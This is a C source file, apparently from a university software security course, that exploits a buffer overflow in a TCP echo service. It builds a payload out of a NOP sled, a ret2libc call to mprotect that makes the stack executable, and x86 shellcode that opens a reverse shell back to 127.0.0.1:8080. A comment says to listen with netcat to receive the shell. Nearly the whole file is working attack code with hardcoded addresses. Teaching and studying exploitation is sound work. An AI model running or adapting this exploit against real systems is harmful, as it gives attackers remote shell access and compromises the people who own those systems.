/*
 * TCP-based Echo Service exploit
 *  - Method: return-to-libc (ret2libc) & code injection (CI) 
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define	ECHO_ADDR_DFL	"127.0.0.1"	/* default IPv4 server address	*/
#define ECHO_PORT_DFL	7777	/* default Echo Protocol port (TCP)	*/
#define	BUF_SZ		1024	/* buffer size */

/* 
 * payload stuff (code injection; CI)
 * 
 * NOP sled & reverse (connect-back) shell at 127.0.0.1:8080
 * (TIP: run `nc -l -p 8080', before executing `expl4', to get the shell)
 */
#define	SHELLCODE_OFF	256
#define	RET_ADDR	"\x8c\xfc\xff\xbf"
#define	NOP		'\x90'
/* 
 * payload stuff (return-to-libc; ret2libc)
 *
 * ret2libc chaining:
 * 	mprotect(0xbffff000, 4KB, RWX) -> shellcode
 */
#define	VULN_BUF_SZ	512
#define	MPROTECT_ADDR	"\xb0\x18\xea\xb7"
#define	MPROTECT_A1	"\x00\xf0\xff\xbf"
#define	MPROTECT_A2	"\x00\x10\x00\x00"
#define	MPROTECT_A3	"\x07\x00\x00\x00"
#define RET_ADDR1_OFF	(VULN_BUF_SZ + 16)
#define RET_ADDR2_OFF	(RET_ADDR1_OFF + 4)
#define	FIRST_ARG_OFF	(RET_ADDR2_OFF + 4)
#define	SECOND_ARG_OFF	(FIRST_ARG_OFF + 4)
#define	THIRD_ARG_OFF	(SECOND_ARG_OFF + 4)	


/* https://www.exploit-db.com/exploits/36397/	*/
unsigned char shellcode[] =
	/* ------------------------------------	*/
	"\x6a\x66"	/* push   $0x66		*/
	"\x58"		/* pop    %eax		*/
	"\x99"		/* cdq    (cltd)	*/
	"\x52"		/* push   %edx		*/
	"\x42"		/* inc    %edx		*/
	"\x52"		/* push   %edx		*/ /* socket(PF_INET, SOCK_STREAM, 0) */
	"\x89\xd3"	/* mov    %edx, %ebx	*/
	"\x42"		/* inc    %edx		*/
	"\x52"		/* push   %edx		*/
	"\x89\xe1"	/* mov    %esp, %ecx	*/
	"\xcd\x80"	/* int    $0x80		*/
	/* ------------------------------------	*/
	"\x93"		/* xchg   %eax, %ebx	*/
	"\x89\xd1"	/* mov    %edx, %ecx	*/ /* dup2(sfd, 2)	*/
	"\xb0\x3f"	/* mov    $0x3f, %al	*/ /* dup2(sfd, 1)	*/
	"\xcd\x80"	/* int    $0x80		*/ /* dup2(sfd, 0)	*/
	"\x49"		/* dec    %ecx		*/
	"\x79\xf9"	/* jns    -7		*/
	/* ------------------------------------	*/
	"\xb0\x66"	/* mov    $0x66, %al	*/
	"\x87\xda"	/* xchg   %ebx, %edx	*/
	"\x68"		/* push			*/
	/* IPv4 address: 127.0.0.1		*/
	"\x7f\x00\x00\x01"
	"\x66\x68"	/* pushw		*/
	/* TCP port: 8080			*/
	"\x1f\x90"
	"\x66\x53"	/* push   %bx		*/ /* connect(...)	*/
	"\x43"		/* inc    %ebx		*/ /* arg0: sfd		*/
	"\x89\xe1"	/* mov    %esp, %ecx	*/ /* arg1: &{AF_INET, 8080, 127.0.0.1} */
	"\x6a\x10"	/* push   $0x10		*/ /* arg2: 0x10	*/
	"\x51"		/* push   %ecx		*/
	"\x52"		/* push   %edx		*/
	"\x89\xe1"	/* mov    %esp, %ecx	*/
	"\xcd\x80"	/* int    $0x80		*/
	/* ------------------------------------	*/
	"\x6a\x0b"	/* push   $0xb		*/
	"\x58"		/* pop    %eax		*/
	"\x99"		/* cdq    (cltd)	*/
	"\x89\xd1"	/* mov    %edx, %ecx	*/
	"\x52"		/* push   %edx		*/ /* execve("/bin/sh", NULL, NULL) */
	"\x68"		/* push			*/
	"\x2f\x2f\x73\x68" /* "//sh"		*/
	"\x68"		/* push			*/
	"\x2f\x62\x69\x6e" /* "/bin"		*/
	"\x89\xe3"	/* mov    %esp, %ebx	*/
	"\xcd\x80";	/* int    $0x80		*/
	/* ------------------------------------	*/

/* cleanup routine */
static void
cleanup(int srv_fd)
{
	/* socket cleanup			*/
	if (srv_fd != -1)
		close(srv_fd);
}

/* server handler */
static void
srv_hndl(int sfd)
{
	/* payload buffer			*/
	char buf[BUF_SZ];

	/* verbose				*/
	fprintf(stdout, "[+] Preparing the payload... ");

	/* cleanup				*/	
	memset(buf, NOP, BUF_SZ);

	/* prepare the payload -- CI part	*/
        memcpy(buf + SHELLCODE_OFF, shellcode, sizeof(shellcode));

	/* prepare the payload -- ret2libc part	*/
	memcpy(buf + RET_ADDR1_OFF, MPROTECT_ADDR, sizeof(MPROTECT_ADDR) - 1);
	memcpy(buf + RET_ADDR2_OFF, RET_ADDR, sizeof(RET_ADDR) - 1);
	memcpy(buf + FIRST_ARG_OFF, MPROTECT_A1, sizeof(MPROTECT_A1) - 1);
	memcpy(buf + SECOND_ARG_OFF, MPROTECT_A2, sizeof(MPROTECT_A2) - 1);
	memcpy(buf + THIRD_ARG_OFF, MPROTECT_A3, sizeof(MPROTECT_A3) - 1);
	
	/* verbose				*/
	fprintf(stdout, "[SUCCESS]\n"); fflush(stdout);	
	fprintf(stdout, "[+] Triggering the exploit... ");

	/* trigger the vulnerability		*/
	write(sfd, buf, THIRD_ARG_OFF + sizeof(MPROTECT_A3) - 1);

	/* verbose				*/
	fprintf(stdout, "[w00t!]\n"); fflush(stdout);
}

int
main(int argc, char **argv)
{
	/* socket descriptor; server		*/
	int sfd = -1;

	/* IPv4 address; server			*/
	struct sockaddr_in
		sin = {
			.sin_family	= AF_INET,
			.sin_port	= 
				((argc > 2 && argv[2]) ?
				htons((in_port_t)strtoul(argv[2], NULL, 10)) :
				htons(ECHO_PORT_DFL)),
			.sin_addr	= 
				{ ((argc > 1 && argv[1]) ?
				inet_addr(argv[1]) :
				inet_addr(ECHO_ADDR_DFL)) },
		};

	/* verbose				*/
	fprintf(stdout, "[+] Creating socket... ");

	/* get the connecting socket		*/
	if ((sfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
		/* failed			*/
		fprintf(stdout, "[FAILURE]\n"); fflush(stdout);	
		perror("[-] socket(2) failed");
		goto err;
	}

	/* verbose				*/
	fprintf(stdout, "[SUCCESS]\n"); fflush(stdout);	
	fprintf(stdout, "[+] Connecting to %s:%hu... ",
			inet_ntoa(sin.sin_addr),
			ntohs(sin.sin_port));

	/* connect to server			*/
	if (connect(sfd,
		(const struct sockaddr *)&sin,
		sizeof(struct sockaddr_in)) == -1) {
		/* failed			*/
		fprintf(stdout, "[FAILURE]\n"); fflush(stdout);	
		perror("[-] connect(2) failed");
		goto err;
	}

	/* verbose				*/
	fprintf(stdout, "[SUCCESS]\n"); fflush(stdout);	

	/* handle the server			*/
	srv_hndl(sfd);

	/* cleanup				*/
	cleanup(sfd);

	/* done; success			*/
	return EXIT_SUCCESS;

	/* error handling			*/
err:
	/* cleanup				*/
	cleanup(sfd);
	
	/* done; error 				*/
	return EXIT_FAILURE;
}
